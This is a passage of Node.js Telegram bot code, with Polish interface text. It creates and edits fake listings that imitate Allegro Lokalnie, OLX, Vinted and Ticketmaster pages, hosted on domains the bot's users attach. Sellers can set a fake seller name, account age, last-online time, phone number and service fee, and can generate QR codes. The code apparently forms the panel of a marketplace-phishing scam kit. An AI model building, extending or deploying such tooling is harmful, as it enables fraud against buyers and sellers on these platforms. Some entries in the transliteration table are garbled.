				`› *Kategoria:* <code>${offer.kategoria}</code>\n` +
				`› *Tagi:* <code>${tagi}</code>\n` +
				`› *Wiek:* <code>${offer.wiek}</code>\n` +
				`› *Ostatnie online:* <code>${offer.lastonline}</code>\n` +
				`› *Numer telefonu:* <code>${offer.numer}</code>\n` +
				`› *Rodzaj:* <code>${offer.rodzaj}</code>\n` +
				`› *Zdjęcia:* ${offer.zdjecia.length}\n\n` +
				`› *Link:* ${offerLink}`;
			caption = fitCaption(caption);

			const options = {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{
								text: "Edytuj nazwę", icon_custom_emoji_id: "6039779802741739617", callback_data: `edit_name_${offer.idoferty}`
							},
							{
								text: "Edytuj opis", icon_custom_emoji_id: "5920046907782074235", callback_data: `edit_desc_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj cenę", icon_custom_emoji_id: "5778421276024509124", callback_data: `edit_price_${offer.idoferty}`
							},
							{
								text: "Edytuj sprzedawcę", icon_custom_emoji_id: "6032994772321309200", callback_data: `edit_seller_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj miasto", icon_custom_emoji_id: "6030399199030284183", callback_data: `edit_city_${offer.idoferty}`
							},
							{
								text: "Edytuj województwo", icon_custom_emoji_id: "5888620056551625531", callback_data: `edit_region_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj kategorię", icon_custom_emoji_id: "5888620056551625531", callback_data: `edit_category_${offer.idoferty}`
							},
							{
								text: "Edytuj Tagi", icon_custom_emoji_id: "5888620056551625531", callback_data: `edit_tags_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj wiek konta", icon_custom_emoji_id: "5890937706803894250",
								callback_data: `edit_wiek_${offer.idoferty}`
							},
							{
								text: "Edytuj rodzaj konta", icon_custom_emoji_id: "6030848053177486888", callback_data: `edit_rodzaj_${offer.idoferty}`
							},
						],
						[
							{
                                text: "Ostatnio online", icon_custom_emoji_id: "5775896410780079073", callback_data: `edit_lastonline_${offer.idoferty}`
							},
							{
                                text: "Numer telefonu", icon_custom_emoji_id: "6039398100408209720", callback_data: `edit_numer_${offer.idoferty}`
							}
						
						],
						[{
								text: "Dodaj zdjęcia", icon_custom_emoji_id: "6030506650522096180", callback_data: `edit_addphotos_${offer.idoferty}`
							},
							{
								text: "Usuń zdjęcia", icon_custom_emoji_id: "6039522349517115015", callback_data: `edit_removephotos_${offer.idoferty}`
							}
						],
						[{
							text: "Załaduj z OLX", icon_custom_emoji_id: "6041730074376410123", callback_data: `loadolx_${offer.idoferty}`
						}],
						[{
							text: "Załaduj z Allegro", icon_custom_emoji_id: "6041730074376410123", callback_data: `loadallegro_${offer.idoferty}`
						}],
						[{
							text: "Kod QR", icon_custom_emoji_id: "6039605143601680423", callback_data: `offer_qr_lokalnie_${offer.idoferty}`
						}],
						[{
							text: "Usuń ofertę", icon_custom_emoji_id: "6030757850274336631", callback_data: `delete_offer_${offer.idoferty}`
						}],
						[{
							text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "my_offers"
						}]
					]
				}
			};

			await bot.deleteMessage(chatId, messageId);
			await bot.sendPhoto(chatId, "bramka.png", {
				caption,
				...options
			})

		} catch (error) {
			console.error("Błąd w funkcji refreshOfferMenu:", error);
		}
	};

	const refreshOfferMenuOLX = async (chatId, messageId, offerId) => {
		try {
			const offers = await loadOffersOLXDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			const users = await loadUsersDB();
			const user = users.find(u => u.id === query.from.id);
			const domain = getEffectiveUserDomainSync(user, publicDomain);
			const offerLink = domain ? `https://olx.${domain}/oferta/${encodeURIComponent(offer.link)}` : "NIE MASZ PODPIETEJ DOMENY";

			if (!offer) return;
			let tagi = offer.tagi.length > 128 ? 'Tagi są zbyt długie, nie da się wyświetlić.' : `\`${offer.tagi}\``;

			let description = offer.description.length > 256 ? 'Opis jest za długi, nie da się wyświetlić.' : `\`${offer.description}\``;
			let caption = `───────── [ 𝕂 ] ─────────\n❖ *OFERTA · OLX*\n──────────────────\n\n` +
				`› *Nazwa:* <code>${offer.nazwa}</code>\n` +
				`› *Opis:* ${description}\n` +
				`› *Cena:* <code>${offer.cena} zł</code>\n` +
				`› *Sprzedawca:* <code>${offer.sprzedawca}</code>\n` +
				`› *Miasto:* <code>${offer.miasto}</code>, <code>${offer.wojewodztwo}</code>\n` +
				`› *Kategoria:* <code>${offer.kategoria}</code>\n` +
				`› *Tagi:* <code>${tagi}</code>\n` +
				`› *Wiek:* <code>${offer.wiek}</code>\n` +
				`› *Ostatnio online:* <code>${offer.lastonline}</code>\n` +
				`› *Numer telefonu:* <code>${offer.numer}</code>\n` +
				`› *Zdjęcia:* ${offer.zdjecia.length}\n\n` +
				`› *Link:* ${offerLink}`;
			caption = fitCaption(caption);

			const options = {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{
								text: "Edytuj nazwę", icon_custom_emoji_id: "6039779802741739617", callback_data: `olx_edit_name_${offer.idoferty}`
							},
							{
								text: "Edytuj opis", icon_custom_emoji_id: "5920046907782074235", callback_data: `olx_edit_desc_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj cenę", icon_custom_emoji_id: "5778421276024509124", callback_data: `olx_edit_price_${offer.idoferty}`
							},
							{
								text: "Edytuj sprzedawcę", icon_custom_emoji_id: "6032994772321309200", callback_data: `olx_edit_seller_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj miasto", icon_custom_emoji_id: "6030399199030284183", callback_data: `olx_edit_city_${offer.idoferty}`
							},
							{
								text: "Edytuj województwo", icon_custom_emoji_id: "5888620056551625531", callback_data: `olx_edit_region_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj kategorię", icon_custom_emoji_id: "5888620056551625531", callback_data: `olx_edit_category_${offer.idoferty}`
							},
							{
								text: "Edytuj Tagi", icon_custom_emoji_id: "5888620056551625531", callback_data: `olx_edit_tags_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj wiek konta", icon_custom_emoji_id: "5890937706803894250",
								callback_data: `olx_edit_wiek_${offer.idoferty}`
							},
							{
								text: "Ostatnio online", icon_custom_emoji_id: "6030848053177486888", callback_data: `olx_edit_lastonline_${offer.idoferty}`
							},
							{
								text: "Edytuj numer telefonu", icon_custom_emoji_id: "6039398100408209720", callback_data: `olx_edit_numer_${offer.idoferty}`
							}
						],
						[{
								text: "Dodaj zdjęcia", icon_custom_emoji_id: "6030506650522096180", callback_data: `olx_edit_addphotos_${offer.idoferty}`
							},
							{
								text: "Usuń zdjęcia", icon_custom_emoji_id: "6039522349517115015", callback_data: `olx_edit_removephotos_${offer.idoferty}`
							}
						],
						[{
							text: "Załaduj z Allegro Archiwum", icon_custom_emoji_id: "6041730074376410123", callback_data: `olxloadallegro_${offer.idoferty}`
						}],
						[{
							text: "Kod QR", icon_custom_emoji_id: "6039605143601680423", callback_data: `offer_qr_olx_${offer.idoferty}`
						}],
						[{
							text: "Usuń ofertę", icon_custom_emoji_id: "6030757850274336631", callback_data: `olxdelete_offer_${offer.idoferty}`
						}],
						[{
							text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "my_offers"
						}]
					]
				}
			};

			await bot.deleteMessage(chatId, messageId);
			await bot.sendPhoto(chatId, "bramka.png", {
				caption,
				...options
			})

		} catch (error) {
			console.error("Błąd w funkcji refreshOfferMenu:", error);
		}
	};

	const refreshOfferMenuTicketmaster = async (chatId, messageId, offerId) => {
		try {
			const offers = await loadOffersTicketmasterDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			if (!offer) return;

			const users = await loadUsersDB();
			const user = users.find(u => u.id === query.from.id);
			const domain = getEffectiveUserDomainSync(user, publicDomain);
			const offerLink = domain
				? buildOfferUrl("ticketmaster", domain, offer.link, offer.idoferty)
				: "NIE MASZ PODPIETEJ DOMENY";

			const tagParts = (offer.tagi || '').split(';').map(s => s.trim());
			let caption = `<tg-emoji emoji-id=\"6039779802741739617\">✏</tg-emoji> <b>Edytujesz bilet Ticketmaster:</b>\n\n` +
				`🎫 Wydarzenie: \`${offer.nazwa}\`\n` +
				`<tg-emoji emoji-id=\"5920046907782074235\">📝</tg-emoji> Opis / arena: <code>${offer.description}</code>\n` +
				`<tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> Cena: <code>${offer.cena} zł</code>\n` +
				`<tg-emoji emoji-id=\"6030399199030284183\">🏙</tg-emoji> Miejsce: <code>${offer.miasto}</code>\n` +
				`<tg-emoji emoji-id=\"5890937706803894250\">📅</tg-emoji> Data: <code>${offer.lastonline}</code>\n` +
				`<tg-emoji emoji-id=\"6043896193887506430\">🪑</tg-emoji> Sekcja: <code>${tagParts[0] || '-'}</code>\n` +
				`<tg-emoji emoji-id=\"6043896193887506430\">🪑</tg-emoji> Rząd: <code>${tagParts[1] || '-'}</code>\n` +
				`<tg-emoji emoji-id=\"6043896193887506430\">🪑</tg-emoji> Miejsca: <code>${tagParts[2] || '-'}</code>\n` +
				`<tg-emoji emoji-id=\"6030506650522096180\">📷</tg-emoji> Ilość zdjęć: ${offer.zdjecia.length}\n\n` +
				`<a href="${offerLink}"><tg-emoji emoji-id=\"6041730074376410123\">📥</tg-emoji> Link do wydarzenia</a>`;

			const options = {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[
							{ text: "Nazwa wydarzenia", icon_custom_emoji_id: "6039779802741739617", callback_data: `tm_edit_name_${offer.idoferty}` },
							{ text: "Opis / arena", icon_custom_emoji_id: "5920046907782074235", callback_data: `tm_edit_desc_${offer.idoferty}` }
						],
						[
							{ text: "Cena biletu", icon_custom_emoji_id: "5778421276024509124", callback_data: `tm_edit_price_${offer.idoferty}` },
							{ text: "Opłata serwisowa", icon_custom_emoji_id: "6034969813032374911", callback_data: `tm_edit_fee_${offer.idoferty}` }
						],
						[
							{ text: "Miejsce", icon_custom_emoji_id: "6030399199030284183", callback_data: `tm_edit_city_${offer.idoferty}` }
						],
						[
							{ text: "Data wydarzenia", icon_custom_emoji_id: "5890937706803894250", callback_data: `tm_edit_date_${offer.idoferty}` },
							{ text: "Sekcja/Rząd/Miejsca", icon_custom_emoji_id: "6043896193887506430", callback_data: `tm_edit_seats_${offer.idoferty}` }
						],
						[
							{ text: "Dodaj zdjęcie", icon_custom_emoji_id: "5881806211195605908", callback_data: `tm_edit_addphotos_${offer.idoferty}` },
							{ text: "Usuń zdjęcia", icon_custom_emoji_id: "6039522349517115015", callback_data: `tm_edit_removephotos_${offer.idoferty}` }
						],
						[
							{ text: "Kod QR", icon_custom_emoji_id: "6039605143601680423", callback_data: `offer_qr_ticketmaster_${offer.idoferty}` }
						],
						[
							{ text: "Usuń ofertę", icon_custom_emoji_id: "6030757850274336631", callback_data: `tm_delete_offer_${offer.idoferty}` }
						],
						[
							{ text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "my_offers_ticketmaster" }
						]
					]
				}
			};

			await bot.deleteMessage(chatId, messageId);
			await bot.sendPhoto(chatId, "bramka.png", { caption, ...options });
		} catch (error) {
			console.error("Błąd w refreshOfferMenuTicketmaster:", error);
		}
	};

	const refreshOfferMenuVinted = async (chatId, messageId, offerId) => {
		try {
			const offers = await loadOffersVintedDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			if (!offer) return;

			const users = await loadUsersDB();
			const user = users.find(u => u.id === query.from.id);
			const domain = getEffectiveUserDomainSync(user, publicDomain);
			const offerLink = domain
				? buildOfferUrl("vinted", domain, offer.link)
				: "NIE MASZ PODPIETEJ DOMENY";

			let caption = fitCaption(markdownToHtml(formatVintedOfferCaption(offer, offerLink)));

			const options = {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: buildVintedOfferKeyboard(offer.idoferty)
				}
			};

			await bot.deleteMessage(chatId, messageId);
			await bot.sendPhoto(chatId, "bramka.png", { caption, ...options });
		} catch (error) {
			console.error("Błąd w refreshOfferMenuVinted:", error);
		}
	};




	const addOffer = async (chatId, userId) => {
		try {
			const offers = await loadOffersDB();

			let offerIndex = (Date.now() % 1000000) + Math.floor(Math.random() * 1000);
			let offerName = "iPhone 15 Pro 128GB Black Titanium";

			let link = offerName.replace(/\s+/g, '-');
			const generateUniqueLink = async (offers, link) => {
				const polishToNormal = {
					'ą': 'a',
					'ć': 'c',
					'ę': 'e',
					'ł': 'l',
					'ń': 'n',
					'ó': 'o',
					'ś': 's',
					'9_': 'z',
					'ż': 'z',
					'Ą': 'A',
					'Ć': 'C',
					'Ę': 'E',
					'Ł': 'L',
					'Ń': 'N',
					'Ó': 'O',
					'9a': 'S',
					'ź': 'Z',
					'Ż': 'Z'
				};

				let sanitizedLink = link
					.replace(/[ąćęłńóśźżĄĆĘŁŃÓŚŹŻ]/g, match => polishToNormal[match] || match)
					.replace(/[^a-zA-Z0-9-]/g, '');

				let newLink = sanitizedLink;
				let counter = 2;

				while (await Offer.exists({
						link: newLink
					})) {
					newLink = sanitizedLink + '-' + counter;
					counter++;
				}

				return newLink;
			};

			let uniqueLink = await generateUniqueLink(offers, link);

			const offerData = {
				idoferty: offerIndex,
				nazwa: offerName,
				description: "Apple iPhone 15 Pro 128GB Black Titanium, świetny stan, bateria 86%, etui MagSafe w zestawie, bez rys i uszkodzeń.",
				cena: "1250",
				sprzedawca: "Grzegorz",
				owner: userId,
				miasto: "Warszawa",
				wojewodztwo: "Mazowieckie",
				kategoria: "Elektronika;Telefony i Akcesoria;Smartfony i telefony komórkowe",
				tagi: "Stan: Używane;Kolor: Czarny;Wbudowana pamięć: 128GB;Model telefonu: iPhone 15 Pro",
				zdjecia: ["iphone15"],
				link: uniqueLink,
				wiek: "10",
				rodzaj: "OSOBA PRYWATNA",
				lastonline: "Dzisiaj o 15:32",
				numer: "Brak",
			};


			const existingOffer = await Offer.findOne({
				idoferty: offerIndex
			});
			if (existingOffer) {
				return;
			}

			await saveOffersDB([...offers, offerData]);

			refreshOfferMenu(chatId, messageId, offerData.idoferty);

		} catch (error) {
			console.error("Wystąpił błąd:", error);
		}
	};



	const addOfferOLX = async (chatId, userId) => {
		try {
			const offers = await loadOffersOLXDB();

			let offerIndex = (Date.now() % 1000000) + Math.floor(Math.random() * 1000);
			let offerName = "iPhone 15 Pro 128GB Black Titanium";

			let link = offerName.replace(/\s+/g, '-');
			const generateUniqueLink = async (offers, link) => {
				const polishToNormal = {
					'ą': 'a',
					'ć': 'c',
					'ę': 'e',
					'ł': 'l',
					'ń': 'n',
					'ó': 'o',
					'ś': 's',
					'9_': 'z',
					'ż': 'z',
					'Ą': 'A',
					'Ć': 'C',
					'Ę': 'E',
					'Ł': 'L',
					'Ń': 'N',
					'Ó': 'O',
					'9a': 'S',
					'ź': 'Z',
					'Ż': 'Z'
				};

				let sanitizedLink = link
					.replace(/[ąćęłńóśźżĄĆĘŁŃÓŚŹŻ]/g, match => polishToNormal[match] || match)
					.replace(/[^a-zA-Z0-9-]/g, '');

				let newLink = sanitizedLink;
				let counter = 2;

				while (await OfferOLX.exists({
						link: newLink
					})) {
					newLink = sanitizedLink + '-' + counter;
					counter++;
				}

				return newLink;
			};

			let uniqueLink = await generateUniqueLink(offers, link);

			const offerData = {
				idoferty: offerIndex,
				nazwa: offerName,
				description: "Apple iPhone 15 Pro 128GB Black Titanium, świetny stan, bateria 86%, etui MagSafe w zestawie, bez rys i uszkodzeń.",
				cena: "1250",
				sprzedawca: "Grzegorz",
				owner: userId,
				miasto: "Warszawa",
				wojewodztwo: "Mazowieckie",
				kategoria: "Elektronika;Telefony i Akcesoria;Smartfony i telefony komórkowe",
				tagi: "Stan: Używane;Kolor: Czarny;Wbudowana pamięć: 128GB;Model telefonu: iPhone 15 Pro",
				zdjecia: ["iphone15"],
				link: uniqueLink,
				wiek: "kwiecień 2015",
				lastonline: "Dzisiaj o 15:32",
				numer: "Brak"
			};


			const existingOffer = await OfferOLX.findOne({
				idoferty: offerIndex
			});
			if (existingOffer) {
				return;
			}

			await saveOffersOLXDB([...offers, offerData]);
			refreshOfferMenuOLX(chatId, messageId, offerData.idoferty);

		} catch (error) {
			console.error("Wystąpił błąd:", error);
		}
	};

	const addOfferTicketmaster = async (chatId, userId) => {
		try {
			const offers = await loadOffersTicketmasterDB();
			const idoferty = crypto.randomBytes(16).toString('hex');
			const offerName = "Twenty One Pilots · The Clancy World Tour";
			let uniqueLink = await generateUniqueOfferLink(OfferTicketmaster, offerName.replace(/\s+/g, '-'));

			const offerData = {
				idoferty,
				nazwa: offerName,
				description: "TAURON Arena, Kraków",
				cena: "568",
				owner: userId,
				miasto: "TAURON Arena, Kraków",
				lastonline: "sob., 15 lis 2025, 19:00",
				tagi: "Section T-301;Row 44;Seats 1-2",
				zdjecia: [`${idoferty}_event`],
				link: uniqueLink,
			};

			await saveOffersTicketmasterDB([...offers, offerData]);
			refreshOfferMenuTicketmaster(chatId, messageId, offerData.idoferty);
		} catch (error) {
			console.error("Błąd addOfferTicketmaster:", error);
		}
	};

	const addOfferVinted = async (chatId, userId) => {
		try {
			const offers = await loadOffersVintedDB();
			const idoferty = String((Date.now() % 1000000) + Math.floor(Math.random() * 1000));
			const offerName = "Kurtka The North Face Nuptse 700 czarna · rozmiar L";
			let uniqueLink = await generateUniqueOfferLink(OfferVinted, `id-${idoferty}-${offerName.replace(/\s+/g, '-')}`);

			const offerData = {
				idoferty,
				nazwa: offerName,
				description: "Sprzedam kurtkę The North Face Nuptse 700 w kolorze czarnym, rozmiar L. Stan bardzo dobry.",
				cena: "620",
				cenaDostawy: "11.49",
				cenaOchrony: "4.99",
				nazwaFirmy: "Vinted Go",
				sprzedawca: "Ania",
				owner: userId,
				miasto: "Kraków",
				kategoria: "Moda",
				tagi: "Stan: Bardzo dobry;Marka: The North Face;Rozmiar: L;Kolor: Czarny;Sezon: Zima",
				zdjecia: [`${idoferty}.1`],
				link: uniqueLink,
				wiek: "2 lata",
				lastonline: "Dzisiaj o 15:32",
			};

			await saveOffersVintedDB([...offers, offerData]);
			refreshOfferMenuVinted(chatId, messageId, offerData.idoferty);
		} catch (error) {
			console.error("Błąd addOfferVinted:", error);
		}
	};





	if (query.data === "add_offer_lokalnie") {
		const offerCheck = await checkOfferCreationAllowed(userId);
		if (!offerCheck.allowed) {
			await sendBlockedStatus(userId, offerCheck.title, offerCheck.message);
		} else {
			addOffer(chatId, userId);
		}
	}

	if (query.data === "add_offer_olx") {
		const offerCheck = await checkOfferCreationAllowed(userId);
		if (!offerCheck.allowed) {
			await sendBlockedStatus(userId, offerCheck.title, offerCheck.message);
		} else {
			addOfferOLX(chatId, userId);
		}
	}


	if (query.data === "add_offer") {
		const offerCheck = await checkOfferCreationAllowed(userId);
		if (!offerCheck.allowed) {
			await sendBlockedStatus(userId, offerCheck.title, offerCheck.message);
			return;
		}

		let caption = `<tg-emoji emoji-id=\"6034969813032374911\">📃</tg-emoji> Nowa oferta`;

		const options = {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [
					[{
						text: "Allegro Lokalnie", icon_custom_emoji_id: "5920332557466997677", callback_data: `add_offer_lokalnie`
					}, {
						text: "OLX", icon_custom_emoji_id: "5920332557466997677", callback_data: `add_offer_olx`
					}],
					[{
						text: "👗 Vinted",
						callback_data: `add_offer_vinted`
					}, {
						text: "🎫 Ticketmaster",
						callback_data: `add_offer_ticketmaster`
					}],
					[{
						text: "🎟 AleBilet",
						callback_data: `add_offer_alebilet`
					}],
					[{
						text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: `back_to_main`
					}]
				]
			}
		};

		bot.editMessageMedia({
			type: "photo",
			media: "attach://bramka.png",
			caption: caption
		}, {
			chat_id: chatId,
			message_id: messageId,
			...options
		});
	}

	const editOfferField = (query, field, prompt) => {
		const offerId = query.data.split("_")[2];
		const chatId = query.message.chat.id;

		loadOffersDB()
			.then(async () => {
				const offers = await loadOffersDB();
				bot.sendMessage(chatId, markdownToHtml(`───────── [ 𝕂 ] ─────────\n❖ *EDYCJA OFERTY*\n──────────────────\n\n› ${prompt}\n\n› Aby anulować wpisz \`stop\`.`), { parse_mode: "HTML" }).then(sentMessage => {
					const listener = async (msg) => {
						if (msg.chat.id !== chatId) return;

						bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});

						if (["stop", "cancel"].includes(msg.text.toLowerCase())) {
							sendTempMessage(chatId, "❌ Edycja anulowana.");
							bot.removeListener("message", listener);
							bot.answerCallbackQuery(query.id);
							return;
						}

						const offer = offers.find(o => o.idoferty === offerId);
						if (!offer) {
							sendTempMessage(chatId, "⚠️ Oferta nie została znaleziona.");
							showUserOffers(chatId, messageId, userId);
							bot.removeListener("message", listener);
							return;
						}
						const generateUniqueLink = async (offers, link) => {
							const polishToNormal = {
								'ą': 'a',
								'ć': 'c',
								'ę': 'e',
								'ł': 'l',
								'ń': 'n',
								'ó': 'o',
								'ś': 's',
								'9_': 'z',
								'ż': 'z',
								'Ą': 'A',
								'Ć': 'C',
								'Ę': 'E',
								'Ł': 'L',
								'Ń': 'N',
								'Ó': 'O',
								'9a': 'S',
								'ź': 'Z',
								'Ż': 'Z'
							};

							let sanitizedLink = link
								.replace(/[ąćęłńóśźżĄĆĘŁŃÓŚŹŻ]/g, match => polishToNormal[match] || match)
								.replace(/[^a-zA-Z0-9-]/g, '');

							let newLink = sanitizedLink;
							let counter = 2;

							while (await Offer.exists({
									link: newLink
								})) {
								newLink = sanitizedLink + '-' + counter;
								counter++;
							}

							return newLink;
						};
						if (field === "nazwa") {
							let newLink = msg.text.replace(/\s+/g, '-');
							newLink = await generateUniqueLink(offers, newLink);

							const updatedOffer = {
								[field]: msg.text,
								link: newLink
							};

							await editOfferDB(offerId, updatedOffer);
							sendTempMessage(chatId, "✅ Nazwa i link oferty zostały zaktualizowane!");
						} else {
							const updatedOffer = {
								[field]: field === "cena" ? parseFloat(msg.text) : msg.text
							};

							await editOfferDB(offerId, updatedOffer);
							sendTempMessage(chatId, "✅ Oferta została zaktualizowana!");
						}

						setTimeout(() => {
							refreshOfferMenu(chatId, query.message.message_id, offerId);
						}, 250);

						bot.removeListener("message", listener);
					};

					bot.on("message", listener);
				}).catch(() => {});
			}).catch(error => {
				console.error("Błąd podczas ładowania ofert:", error);
			});
	};


	const editOfferFieldOLX = (query, field, prompt) => {
		const offerId = query.data.split("_")[3];
		const chatId = query.message.chat.id;

		loadOffersOLXDB()
			.then(async () => {
				const offers = await loadOffersOLXDB();
				bot.sendMessage(chatId, markdownToHtml(`───────── [ 𝕂 ] ─────────\n❖ *EDYCJA OFERTY*\n──────────────────\n\n› ${prompt}\n\n› Aby anulować wpisz \`stop\`.`), { parse_mode: "HTML" }).then(sentMessage => {
					const listener = async (msg) => {
						if (msg.chat.id !== chatId) return;

						bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});

						if (["stop", "cancel"].includes(msg.text.toLowerCase())) {
							sendTempMessage(chatId, "❌ Edycja anulowana.");
							bot.removeListener("message", listener);
							bot.answerCallbackQuery(query.id);
							return;
						}

						const offer = offers.find(o => o.idoferty === offerId);
						if (!offer) {
							sendTempMessage(chatId, "⚠️ Oferta nie została znaleziona.");
							showUserOffers(chatId, messageId, userId);
							bot.removeListener("message", listener);
							return;
						}
						const generateUniqueLink = async (offers, link) => {
							const polishToNormal = {
								'ą': 'a',
								'ć': 'c',
								'ę': 'e',
								'ł': 'l',
								'ń': 'n',
								'ó': 'o',
								'ś': 's',
								'9_': 'z',
								'ż': 'z',
								'Ą': 'A',
								'Ć': 'C',
								'Ę': 'E',
								'Ł': 'L',
								'Ń': 'N',
								'Ó': 'O',
								'9a': 'S',
								'ź': 'Z',
								'Ż': 'Z'
							};

							let sanitizedLink = link
								.replace(/[ąćęłńóśźżĄĆĘŁŃÓŚŹŻ]/g, match => polishToNormal[match] || match)
								.replace(/[^a-zA-Z0-9-]/g, '');

							let newLink = sanitizedLink;
							let counter = 2;

							while (await Offer.exists({
									link: newLink
								})) {
								newLink = sanitizedLink + '-' + counter;
								counter++;
							}

							return newLink;
						};
						if (field === "nazwa") {
							let newLink = msg.text.replace(/\s+/g, '-');
							newLink = await generateUniqueLink(offers, newLink);

							const updatedOffer = {
								[field]: msg.text,
								link: newLink
							};

							await editOfferDBOLX(offerId, updatedOffer);
							sendTempMessage(chatId, "✅ Nazwa i link oferty zostały zaktualizowane!");
						} else if (field === "oplata") {
							const raw = (msg.text || "").trim().toLowerCase();
							if (["auto", "reset", "0", "-", "brak"].includes(raw)) {
								await editOfferDBOLX(offerId, { oplata: "" });
								sendTempMessage(chatId, "✅ Opłata serwisowa: automatyczna.");
							} else {
								const val = parseFloat(raw.replace(",", "."));
								if (!Number.isFinite(val) || val < 0) {
									sendTempMessage(chatId, "❌ Podaj kwotę opłaty (np. 25) albo wpisz auto.");
								} else {
									await editOfferDBOLX(offerId, { oplata: String(val) });
									sendTempMessage(chatId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Opłata serwisowa: ${val.toFixed(2)} zł.`);
								}
							}
						} else {
							const updatedOffer = {
								[field]: field === "cena" ? parseFloat(msg.text) : msg.text
							};

							await editOfferDBOLX(offerId, updatedOffer);
							sendTempMessage(chatId, "✅ Oferta została zaktualizowana!");
						}

						setTimeout(() => {
							refreshOfferMenuOLX(chatId, query.message.message_id, offerId);
						}, 250);

						bot.removeListener("message", listener);
					};

					bot.on("message", listener);
				}).catch(() => {});
			}).catch(error => {
				console.error("Błąd podczas ładowania ofert:", error);
			});
	};


	if (query.data.startsWith("olx_edit_name_")) editOfferFieldOLX(query, "nazwa", "✏️ Podaj nową nazwę oferty:");
	if (query.data.startsWith("olx_edit_desc_")) editOfferFieldOLX(query, "description", "📝 Podaj nowy opis oferty:");
	if (query.data.startsWith("olx_edit_price_")) editOfferFieldOLX(query, "cena", "💰 Podaj nową cenę oferty:");
	if (query.data.startsWith("olx_edit_seller_")) editOfferFieldOLX(query, "sprzedawca", "👤 Podaj nową nazwę sprzedawcy:");
	if (query.data.startsWith("olx_edit_city_")) editOfferFieldOLX(query, "miasto", "🏙 Podaj nowe miasto:");
	if (query.data.startsWith("olx_edit_region_")) editOfferFieldOLX(query, "wojewodztwo", "🏷️ Podaj nowe województwo:");
	if (query.data.startsWith("olx_edit_category_")) editOfferFieldOLX(query, "kategoria", "🏷 Podaj nową kategorię:");
	if (query.data.startsWith("olx_edit_tags_")) editOfferFieldOLX(query, "tagi", "🏷 Podaj nowe tagi:");
	if (query.data.startsWith("olx_edit_wiek_")) editOfferFieldOLX(query, "wiek", "👵 Podaj wiek konta: (NP: kwiecień 2010)");
	if (query.data.startsWith("olx_edit_lastonline_")) editOfferFieldOLX(query, "lastonline", "❓ Podaj ostatnie logowanie (Dzisiaj o 16:20)");
	if (query.data.startsWith("olx_edit_numer_")) editOfferFieldOLX(query, "numer", "☎️ Podaj numer telefonu (Moze byc Brak)");

	const editOfferFieldTicketmaster = (query, field, prompt) => {
		const offerId = query.data.split("_").slice(3).join("_");
		const chatId = query.message.chat.id;

		loadOffersTicketmasterDB().then(async () => {
			const offers = await loadOffersTicketmasterDB();
			bot.sendMessage(chatId, markdownToHtml(`───────── [ 𝕂 ] ─────────\n❖ *EDYCJA OFERTY*\n──────────────────\n\n› ${prompt}\n\n› Aby anulować wpisz \`stop\`.`), { parse_mode: "HTML" }).then(sentMessage => {
				const listener = async (msg) => {
					if (msg.chat.id !== chatId) return;
					bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});

					if (["stop", "cancel"].includes((msg.text || "").toLowerCase())) {
						sendTempMessage(chatId, "❌ Edycja anulowana.");
						bot.removeListener("message", listener);
						return;
					}

					const offer = offers.find(o => o.idoferty === offerId);
					if (!offer) {
						sendTempMessage(chatId, "⚠️ Oferta nie została znaleziona.");
						bot.removeListener("message", listener);
						return;
					}

					if (field === "nazwa") {
						const newLink = await generateUniqueOfferLink(OfferTicketmaster, msg.text.replace(/\s+/g, '-'));
						await editOfferDBTicketmaster(offerId, { nazwa: msg.text, link: newLink });
						sendTempMessage(chatId, "✅ Nazwa i link zostały zaktualizowane!");
					} else if (field === "oplata") {
						const raw = (msg.text || "").trim().toLowerCase();
						if (["auto", "reset", "0", "-", "brak"].includes(raw)) {
							await editOfferDBTicketmaster(offerId, { oplata: "" });
							sendTempMessage(chatId, "✅ Opłata serwisowa: automatyczna (15%).");
						} else {
							const val = parseFloat(raw.replace(",", "."));
							if (!Number.isFinite(val) || val < 0) {
								sendTempMessage(chatId, "❌ Podaj kwotę opłaty (np. 25) albo wpisz auto.");
							} else {
								await editOfferDBTicketmaster(offerId, { oplata: String(val) });
								sendTempMessage(chatId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Opłata serwisowa: ${val.toFixed(2)} zł.`);
							}
						}
					} else {
						await editOfferDBTicketmaster(offerId, {
							[field]: field === "cena" ? parseFloat(msg.text) : msg.text
						});
						sendTempMessage(chatId, "✅ Oferta została zaktualizowana!");
					}

					setTimeout(() => refreshOfferMenuTicketmasterGlobal(chatId, query.message.message_id, offerId, query.from.id), 250);
					bot.removeListener("message", listener);
				};
				bot.on("message", listener);
			}).catch(() => {});
		}).catch(error => console.error("Błąd editOfferFieldTicketmaster:", error));
	};

	const editOfferFieldVinted = (query, field, prompt) => {
		const offerId = query.data.split("_").slice(3).join("_");
		const chatId = query.message.chat.id;

		loadOffersVintedDB().then(async () => {
			const offers = await loadOffersVintedDB();
			const promptText = `───────── [ 𝕂 ] ─────────\n❖ *EDYCJA OFERTY · VINTED*\n──────────────────\n\n` +
				`› ${prompt}\n\n› Aby anulować wpisz \`stop\`.`;
			bot.sendMessage(chatId, markdownToHtml(promptText), { parse_mode: "HTML" }).then(sentMessage => {
				const listener = async (msg) => {
